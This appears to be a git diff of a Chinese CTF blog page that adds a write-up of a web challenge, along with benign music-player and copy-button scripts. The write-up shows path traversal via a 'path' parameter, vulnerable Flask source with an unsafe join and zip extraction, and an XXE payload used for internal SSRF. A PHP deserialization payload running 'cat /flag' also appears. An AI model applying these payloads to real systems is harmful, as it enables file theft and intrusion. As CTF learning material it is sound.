@@ -30,8 +30,14 @@
 <meta property="og:image" content="https://tyboykali.github.io/images/image-20260915203511543.png">
 <meta property="og:image" content="https://tyboykali.github.io/images/image-20260915204959751.png">
 <meta property="og:image" content="https://tyboykali.github.io/images/image-20260915205116440.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20261008201657310.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20261009195418045.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20261009200611426.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20261009210200640.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20261009210856326.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20261009211354899.png">
 <meta property="article:published_time" content="2026-09-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2026-09-25T07:53:16.326Z">
+<meta property="article:modified_time" content="2026-10-11T16:00:00.000Z">
 <meta property="article:author" content="TYBOYKALI">
 <meta property="article:tag" content="CTF, Web Security, Security Research, Notes">
 <meta name="twitter:card" content="summary">
@@ -1666,6 +1672,50 @@ body:has(#container.mobile-nav-on) #player-playlist {
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;lt&quot;:4:&#123;s:4:&quot;impo&quot;;O:3:&quot;fin&quot;:3:&#123;s:1:&quot;a&quot;;s:6:&quot;system&quot;;s:3:&quot;url&quot;;s:21:&quot;https://www.ctfer.vip&quot;;s:5:&quot;title&quot;;s:9:&quot;cat /flag&quot;;&#125;s:4:&quot;md51&quot;;s:9:&quot;240610708&quot;;s:4:&quot;md52&quot;;s:7:&quot;QLTHNDT&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>即可得到答案</p>
+<h3 id="awdp-safe"><a href="#awdp-safe" class="headerlink" title="awdp safe"></a>awdp safe</h3><p>打开网站把按钮试了试发现一个可疑的路径</p>
+<p><img src="/images/image-20261008201657310.png" alt="image-20261008201657310"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://9b6f6917-0f00-448c-85a3-a09370ff9b2f.challenge.ctf.show/api/v1/artifacts?path=templates&amp;filename=123</span><br></pre></td></tr></table></figure>
+
+<p>修改成根目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://9b6f6917-0f00-448c-85a3-a09370ff9b2f.challenge.ctf.show/api/v1/artifacts?path=/&amp;filename=</span><br></pre></td></tr></table></figure>
+
+<p>发现可以查看根目录内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;items&quot;:[&#123;&quot;is_dir&quot;:false,&quot;name&quot;:&quot;.dockerenv&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;app&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;bin&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;boot&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;dev&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;etc&quot;&#125;,&#123;&quot;is_dir&quot;:false,&quot;name&quot;:&quot;flag&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;home&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;lib&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;lib64&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;media&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;mnt&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;opt&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;proc&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;root&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;run&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;sbin&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;srv&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;sys&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;tmp&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;usr&quot;&#125;,&#123;&quot;is_dir&quot;:true,&quot;name&quot;:&quot;var&quot;&#125;],&quot;path&quot;:&quot;/&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试了读取下flag是空文件，试试app目录，找到app.py文件下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://9b6f6917-0f00-448c-85a3-a09370ff9b2f.challenge.ctf.show/api/v1/artifacts?path=/app&amp;filename=app.py</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DATA_DIR = os.environ.get(<span class="string">&quot;B_DATA_DIR&quot;</span>, <span class="string">&quot;/tmp/b_data&quot;</span>)</span><br><span class="line">os.makedirs(DATA_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_safe_join</span>(<span class="params">base: <span class="built_in">str</span>, p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base, p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/internal/file&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_file</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&quot;path&quot;</span>, <span class="string">&quot;docxTemplates&quot;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&quot;filename&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    target_dir = _safe_join(DATA_DIR, path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        fp = os.path.join(target_dir, filename)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(fp, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">return</span> Response(f.read(), content_type=<span class="string">&quot;application/octet-stream&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="string">&quot;NOT_FOUND&quot;</span>, status=<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        items = []</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">sorted</span>(os.listdir(target_dir)):</span><br><span class="line">            p = os.path.join(target_dir, n)</span><br><span class="line">            items.append(&#123;<span class="string">&quot;name&quot;</span>: n, <span class="string">&quot;is_dir&quot;</span>: os.path.isdir(p)&#125;)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;path&quot;</span>: path, <span class="string">&quot;items&quot;</span>: items&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;path&quot;</span>: path, <span class="string">&quot;items&quot;</span>: []&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/render&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_xml</span>():</span><br><span class="line">    content = request.args.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">    author = request.args.get(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Anonymous&quot;</span>)</span><br><span class="line">    hide = request.args.get(<span class="string">&quot;hide&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    xml = <span class="string">f&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- post by <span class="subst">&#123;author&#125;</span> --&gt;</span></span><br><span class="line"><span class="string">            &lt;doc&gt;</span></span><br><span class="line"><span class="string">            &lt;content&gt;<span class="subst">&#123;content&#125;</span>&lt;/content&gt;</span></span><br><span class="line"><span class="string">            &lt;hide&gt;<span class="subst">&#123;hide&#125;</span>&lt;/hide&gt;</span></span><br><span class="line"><span class="string">            &lt;/doc&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, content_type=<span class="string">&quot;text/xml; charset=utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#处理SafeViewer服务器的http://viewer:5000/ops/sync接口 过来的数据同步请求</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/internal/upload&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_upload</span>():</span><br><span class="line">    dest_path = <span class="string">&quot;docxTemplates&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;file&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> _err(<span class="string">&quot;NO_FILE&quot;</span>)</span><br><span class="line"></span><br><span class="line">    f = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f <span class="keyword">or</span> <span class="keyword">not</span> f.filename:</span><br><span class="line">        <span class="keyword">return</span> _err(<span class="string">&quot;BAD_FILE&quot;</span>)</span><br><span class="line"></span><br><span class="line">    base_dir = os.path.join(<span class="string">&quot;/app/&quot;</span>, dest_path)</span><br><span class="line">    os.makedirs(base_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    zip_path = os.path.join(base_dir, <span class="string">&quot;src.zip&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f.save(zip_path)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> _err(<span class="string">&quot;SAVE_FAILED&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> z:</span><br><span class="line">            z.extractall(base_dir)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> _err(<span class="string">&quot;UNZIP_FAILED&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.remove(zip_path)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;ok&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;path&quot;</span>: dest_path&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5001</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里存在第一关的flag.txt</p>
+<p>发现里面特意备注了这条</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#处理SafeViewer服务器的http://viewer:5000/ops/sync接口 过来的数据同步请求</span><br></pre></td></tr></table></figure>
+
+<p>找找发现存在xml注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/render&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_xml</span>():</span><br><span class="line">    content = request.args.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">    author = request.args.get(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Anonymous&quot;</span>)</span><br><span class="line">    hide = request.args.get(<span class="string">&quot;hide&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    xml = <span class="string">f&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- post by <span class="subst">&#123;author&#125;</span> --&gt;</span></span><br><span class="line"><span class="string">            &lt;doc&gt;</span></span><br><span class="line"><span class="string">            &lt;content&gt;<span class="subst">&#123;content&#125;</span>&lt;/content&gt;</span></span><br><span class="line"><span class="string">            &lt;hide&gt;<span class="subst">&#123;hide&#125;</span>&lt;/hide&gt;</span></span><br><span class="line"><span class="string">            &lt;/doc&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, content_type=<span class="string">&quot;text/xml; charset=utf-8&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">author:</span><br><span class="line">--&gt;&lt;!DOCTYPE doc [&lt;!ENTITY xxe SYSTEM &#x27;http://viewer:5000/ops/sync&#x27;&gt;]&gt;&lt;!--</span><br><span class="line">content:</span><br><span class="line">&amp;xxe;</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;var&#x2F;log&#x2F;nginx目录，找到access.log，下载可得到</p>
+<p><img src="/images/image-20261009195418045.png" alt="image-20261009195418045"></p>
+<p>找到一条服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.2.192.4 - - [09/Oct/2026:11:47:55 +0000] &quot;GET /create?author=Anonymous&amp;content=&amp;hide=0&amp;policy_id= HTTP/1.1&quot; 200 643 &quot;-&quot; &quot;python-requests/2.32.3&quot;</span><br></pre></td></tr></table></figure>
+
+<p>应该是新建文档操作</p>
+<p>说明文章写入处的参数和render侧是一样的，传入xxe参数</p>
+<p><img src="/images/image-20261009200611426.png" alt="image-20261009200611426"></p>
+<p>再利用之前的目录穿越可发现&#x2F;app&#x2F;docxTemplates目录下存在flag.txt，是第二关的</p>
+<p><img src="/images/image-20261009210200640.png" alt="image-20261009210200640"></p>
+<p><img src="/images/image-20261009210856326.png" alt="image-20261009210856326"></p>
+<p>下一个flag在viewer侧的根目录下，路径为&#x2F;galf</p>
+<p>viewer把文件上传到render的&#x2F;internal&#x2F;upload交由render解压到到&#x2F;app&#x2F;docxTemplates&#x2F;</p>
+<p><img src="/images/image-20261009211354899.png" alt="image-20261009211354899"></p>
+<p>去api接口访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://8f887508-a61f-43b2-b174-20e45cbe6199.challenge.ctf.show/api/v1/artifacts?path=/app/docxTemplates&amp;filename=galf</span><br></pre></td></tr></table></figure>
+
+<p>即可得到最后一关答案</p>
 
       
     </div>
@@ -1823,94 +1873,136 @@ body:has(#container.mobile-nav-on) #player-playlist {
   });
 })();
 </script>
+<div id="music-player" role="region" aria-label="音乐播放器">
+  <div class="player-row">
+    <button class="player-btn" id="btn-prev" type="button" title="上一首" aria-label="上一首"><span class="fa fa-step-backward" aria-hidden="true"></span></button>
+    <button class="player-btn play-btn" id="btn-play" type="button" title="播放" aria-label="播放" aria-pressed="false"><span class="fa fa-play" aria-hidden="true"></span></button>
+    <button class="player-btn" id="btn-next" type="button" title="下一首" aria-label="下一首"><span class="fa fa-step-forward" aria-hidden="true"></span></button>
+  </div>
+  <div class="player-info" aria-live="polite">
+    <span class="player-title" id="player-title">NO TRACK</span>
+    <span class="player-time" id="player-time">00:00 / 00:00</span>
+  </div>
+  <div class="player-volume-wrap">
+    <span class="fa fa-volume-up" aria-hidden="true"></span>
+    <input type="range" class="player-volume" id="player-volume" min="0" max="100" value="2" aria-label="音量">
+  </div>
+  <button class="player-btn" id="btn-playlist" type="button" title="播放列表" aria-label="播放列表" aria-expanded="false"><span class="fa fa-list-ul" aria-hidden="true"></span></button>
+</div>
+<div id="player-playlist" role="listbox" aria-label="播放列表"></div>
+
 <script>
 (function() {
-  document.querySelectorAll('figure.highlight').forEach(function(block) {
-    var codeNode = block.querySelector('.code pre');
-    if (!codeNode) return;
+  var songs = [
+    { name: 'gta4', file: '/music/gta4.mp3' },
+    { name: 'try', file: '/music/try.mp3' },
+    { name: '可爱', file: '/music/可爱.mp3' },
+    { name: '打上火花', file: '/music/打上火花.mp3' },
+    { name: '谢谢', file: '/music/谢谢.mp3' },
+    { name: 'L_Youd _ Zerky - TempIe', file: '/music/L_Youd _ Zerky - TempIe (混音_Remix).ogg' },
+    { name: 'Virtual Riot - Purple Dragons', file: '/music/Virtual Riot - Purple Dragons (Dragons VIP).ogg' },
+    { name: 'All We Know (Virtual Riot Remix)', file: '/music/Virtual Riot _ The Chainsmokers _ Phoebe Ryan - All We Know (Virtual Riot Remix).ogg' },
+    { name: '昼夜 - 千与千寻', file: '/music/昼夜 - 千与千寻 (钢琴版).ogg' },
+    { name: 'lucky (氛围版)', file: '/music/等一会就睡 - 【FREE】lucky (氛围版).ogg' },
+    { name: '鲜花', file: '/music/鲜花.mp4' }
+  ];
 
-    var button = document.createElement('button');
-    button.className = 'code-copy-btn';
-    button.type = 'button';
-    button.title = '复制代码';
-    button.setAttribute('aria-label', '复制代码');
-    button.innerHTML = '<span class="fa fa-copy" aria-hidden="true"></span>';
-    block.appendChild(button);
+  var audio = new Audio();
+  var current = 0;
+  var playing = false;
+  var elPlay = document.getElementById('btn-play');
+  var elTitle = document.getElementById('player-title');
+  var elTime = document.getElementById('player-time');
+  var elVolume = document.getElementById('player-volume');
+  var elPlaylist = document.getElementById('player-playlist');
+  var elBtnPlaylist = document.getElementById('btn-playlist');
 
-    function setState(state) {
-      var succeeded = state === 'copied';
-      button.classList.toggle('copied', succeeded);
-      button.setAttribute('aria-label', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
-      button.setAttribute('title', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
-      button.innerHTML = '<span class="fa fa-' + (succeeded ? 'check' : state === 'failed' ? 'times' : 'copy') + '" aria-hidden="true"></span>';
+  audio.volume = 0.02;
+
+  function fmtTime(value) {
+    if (!value || isNaN(value)) return '00:00';
+    var minutes = Math.floor(value / 60);
+    var seconds = Math.floor(value % 60);
+    return minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+  }
+
+  function setPlayState(isPlaying) {
+    playing = isPlaying;
+    elPlay.innerHTML = '<span class="fa fa-' + (playing ? 'pause' : 'play') + '" aria-hidden="true"></span>';
+    elPlay.setAttribute('aria-label', playing ? '暂停' : '播放');
+    elPlay.setAttribute('title', playing ? '暂停' : '播放');
+    elPlay.setAttribute('aria-pressed', String(playing));
+  }
+
+  function load(index) {
+    current = index;
+    audio.src = songs[index].file;
+    elTitle.textContent = songs[index].name;
+    renderPlaylist();
+    if (playing) {
+      audio.play().catch(function() { setPlayState(false); });
     }
+  }
 
-    function fallbackCopy(text) {
-      var textarea = document.createElement('textarea');
-      textarea.value = text;
-      textarea.style.position = 'fixed';
-      textarea.style.opacity = '0';
-      document.body.appendChild(textarea);
-      textarea.select();
-      var copied = document.execCommand('copy');
-      document.body.removeChild(textarea);
-      return copied;
+  function togglePlay() {
+    if (!audio.src) load(0);
+    if (audio.paused) {
+      audio.play().then(function() { setPlayState(true); }).catch(function() { setPlayState(false); });
+    } else {
+      audio.pause();
+      setPlayState(false);
     }
+  }
 
-    button.addEventListener('click', function() {
-      var text = codeNode.textContent;
-      var operation = navigator.clipboard
-        ? navigator.clipboard.writeText(text).then(function() { return true; })
-        : Promise.resolve(fallbackCopy(text));
+  function next() { load((current + 1) % songs.length); }
+  function previous() { load((current - 1 + songs.length) % songs.length); }
 
-      operation.then(function(copied) {
-        setState(copied ? 'copied' : 'failed');
-      }).catch(function() {
-        setState(fallbackCopy(text) ? 'copied' : 'failed');
-      }).finally(function() {
-        setTimeout(function() { setState('idle'); }, 1800);
-      });
-    });
+  function renderPlaylist() {
+    elPlaylist.innerHTML = songs.map(function(song, index) {
+      return '<div class="pl-item' + (index === current ? ' active' : '') + '" role="option" aria-selected="' + (index === current) + '" data-idx="' + index + '">' + song.name + '</div>';
+    }).join('');
+  }
+
+  elPlay.addEventListener('click', togglePlay);
+  document.getElementById('btn-prev').addEventListener('click', previous);
+  document.getElementById('btn-next').addEventListener('click', next);
+
+  elVolume.addEventListener('input', function() {
+    audio.volume = this.value / 100;
   });
+
+  elBtnPlaylist.addEventListener('click', function(event) {
+    event.stopPropagation();
+    var expanded = !elPlaylist.classList.contains('show');
+    elPlaylist.classList.toggle('show', expanded);
+    elBtnPlaylist.setAttribute('aria-expanded', String(expanded));
+  });
+
+  elPlaylist.addEventListener('click', function(event) {
+    var item = event.target.closest('.pl-item');
+    if (!item) return;
+    load(parseInt(item.getAttribute('data-idx'), 10));
+    audio.play().then(function() { setPlayState(true); }).catch(function() { setPlayState(false); });
+  });
+
+  document.addEventListener('click', function(event) {
+    if (!elPlaylist.contains(event.target) && event.target !== elBtnPlaylist) {
+      elPlaylist.classList.remove('show');
+      elBtnPlaylist.setAttribute('aria-expanded', 'false');
+    }
+  });
+
+  audio.addEventListener('timeupdate', function() {
+    elTime.textContent = fmtTime(audio.currentTime) + ' / ' + fmtTime(audio.duration || 0);
+  });
+  audio.addEventListener('ended', function() { next(); });
+  audio.addEventListener('pause', function() { setPlayState(false); });
+  audio.addEventListener('play', function() { setPlayState(true); });
+  audio.addEventListener('error', function() { setPlayState(false); });
+
+  renderPlaylist();
 })();
 </script>
-<style>
-.code-copy-btn {
-  position: absolute;
-  top: 8px;
-  right: 8px;
-  z-index: 10;
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-  width: 30px;
-  height: 28px;
-  padding: 0;
-  background: rgba(13, 16, 18, 0.9);
-  border: 1px solid var(--gk-border);
-  border-radius: 3px;
-  color: var(--gk-muted);
-  cursor: pointer;
-  font-size: 11px;
-  opacity: 0.62;
-  transition: color 150ms ease, border-color 150ms ease, opacity 150ms ease;
-}
-
-figure.highlight:hover .code-copy-btn,
-.code-copy-btn:focus-visible {
-  opacity: 1;
-}
-
-.code-copy-btn:hover {
-  border-color: var(--gk-cyan);
-  color: var(--gk-cyan);
-}
-
-.code-copy-btn.copied {
-  border-color: var(--gk-green);
-  color: var(--gk-green);
-}
-</style>
 
 <script>
 (function() {
@@ -2104,136 +2196,94 @@ figure.highlight:hover .code-copy-btn,
 }
 </style>
 
-<div id="music-player" role="region" aria-label="音乐播放器">
-  <div class="player-row">
-    <button class="player-btn" id="btn-prev" type="button" title="上一首" aria-label="上一首"><span class="fa fa-step-backward" aria-hidden="true"></span></button>
-    <button class="player-btn play-btn" id="btn-play" type="button" title="播放" aria-label="播放" aria-pressed="false"><span class="fa fa-play" aria-hidden="true"></span></button>
-    <button class="player-btn" id="btn-next" type="button" title="下一首" aria-label="下一首"><span class="fa fa-step-forward" aria-hidden="true"></span></button>
-  </div>
-  <div class="player-info" aria-live="polite">
-    <span class="player-title" id="player-title">NO TRACK</span>
-    <span class="player-time" id="player-time">00:00 / 00:00</span>
-  </div>
-  <div class="player-volume-wrap">
-    <span class="fa fa-volume-up" aria-hidden="true"></span>
-    <input type="range" class="player-volume" id="player-volume" min="0" max="100" value="2" aria-label="音量">
-  </div>
-  <button class="player-btn" id="btn-playlist" type="button" title="播放列表" aria-label="播放列表" aria-expanded="false"><span class="fa fa-list-ul" aria-hidden="true"></span></button>
-</div>
-<div id="player-playlist" role="listbox" aria-label="播放列表"></div>
-
 <script>
 (function() {
-  var songs = [
-    { name: 'gta4', file: '/music/gta4.mp3' },
-    { name: 'try', file: '/music/try.mp3' },
-    { name: '可爱', file: '/music/可爱.mp3' },
-    { name: '打上火花', file: '/music/打上火花.mp3' },
-    { name: '谢谢', file: '/music/谢谢.mp3' },
-    { name: 'L_Youd _ Zerky - TempIe', file: '/music/L_Youd _ Zerky - TempIe (混音_Remix).ogg' },
-    { name: 'Virtual Riot - Purple Dragons', file: '/music/Virtual Riot - Purple Dragons (Dragons VIP).ogg' },
-    { name: 'All We Know (Virtual Riot Remix)', file: '/music/Virtual Riot _ The Chainsmokers _ Phoebe Ryan - All We Know (Virtual Riot Remix).ogg' },
-    { name: '昼夜 - 千与千寻', file: '/music/昼夜 - 千与千寻 (钢琴版).ogg' },
-    { name: 'lucky (氛围版)', file: '/music/等一会就睡 - 【FREE】lucky (氛围版).ogg' },
-    { name: '鲜花', file: '/music/鲜花.mp4' }
-  ];
+  document.querySelectorAll('figure.highlight').forEach(function(block) {
+    var codeNode = block.querySelector('.code pre');
+    if (!codeNode) return;
 
-  var audio = new Audio();
-  var current = 0;
-  var playing = false;
-  var elPlay = document.getElementById('btn-play');
-  var elTitle = document.getElementById('player-title');
-  var elTime = document.getElementById('player-time');
-  var elVolume = document.getElementById('player-volume');
-  var elPlaylist = document.getElementById('player-playlist');
-  var elBtnPlaylist = document.getElementById('btn-playlist');
+    var button = document.createElement('button');
+    button.className = 'code-copy-btn';
+    button.type = 'button';
+    button.title = '复制代码';
+    button.setAttribute('aria-label', '复制代码');
+    button.innerHTML = '<span class="fa fa-copy" aria-hidden="true"></span>';
+    block.appendChild(button);
 
-  audio.volume = 0.02;
-
-  function fmtTime(value) {
-    if (!value || isNaN(value)) return '00:00';
-    var minutes = Math.floor(value / 60);
-    var seconds = Math.floor(value % 60);
-    return minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
-  }
-
-  function setPlayState(isPlaying) {
-    playing = isPlaying;
-    elPlay.innerHTML = '<span class="fa fa-' + (playing ? 'pause' : 'play') + '" aria-hidden="true"></span>';
-    elPlay.setAttribute('aria-label', playing ? '暂停' : '播放');
-    elPlay.setAttribute('title', playing ? '暂停' : '播放');
-    elPlay.setAttribute('aria-pressed', String(playing));
-  }
-
-  function load(index) {
-    current = index;
-    audio.src = songs[index].file;
-    elTitle.textContent = songs[index].name;
-    renderPlaylist();
-    if (playing) {
-      audio.play().catch(function() { setPlayState(false); });
+    function setState(state) {
+      var succeeded = state === 'copied';
+      button.classList.toggle('copied', succeeded);
+      button.setAttribute('aria-label', succeeded ? '已复制' : state === 'failed' ? '复制失败' : '复制代码');
